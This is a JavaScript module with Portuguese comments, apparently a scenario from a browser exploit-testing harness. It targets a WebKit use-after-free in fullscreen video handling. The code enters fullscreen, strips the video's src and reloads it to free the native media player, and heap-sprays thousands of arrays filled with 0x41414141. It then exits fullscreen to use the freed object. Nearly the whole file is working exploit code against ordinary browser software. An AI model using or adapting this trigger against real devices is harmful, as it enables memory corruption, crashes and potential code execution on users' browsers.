/**
 * CENÁRIO: VIDEO_FULLSCREEN_SRC_UAF
 * Alvo: FullscreenVideoController + MediaPlayerPrivate
 */

export default {
    id:       'VIDEO_FULLSCREEN_SRC_UAF',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Evita o GPU Hang (Soft Brick) mantendo o DOM intacto, mas destrói ' +
                 'o MediaPlayerPrivate C++ removendo o src e forçando um load() ' +
                 'durante o Fullscreen, seguido do Spray de 0x41414141.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.container.appendChild(this.video);

        // O nosso payload malicioso (Ponteiros 0x41414141 = "AAAA")
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entramos em Fullscreen nativo (Manx)
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }
            
            // Aguardamos a transição gráfica estabilizar
            await new Promise(r => setTimeout(r, 400)); 

            // 2. A MÁGICA: Em vez de remover o elemento do DOM, arrancamos o "motor" do vídeo!
            // Isso força o WebKit a deletar o MediaPlayerPrivate antigo.
            this.video.removeAttribute('src');
            this.video.load(); 

            // 3. SPRAY: Preenchemos o buraco do player antigo com os nossos ponteiros
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 4. USE: Dizemos ao controlador para sair. 
            // O controlador ainda aponta para o MediaPlayerPrivate que acabámos de destruir no passo 2!
            if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (this.video.webkitExitFullscreen) {
                this.video.webkitExitFullscreen();
            }

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
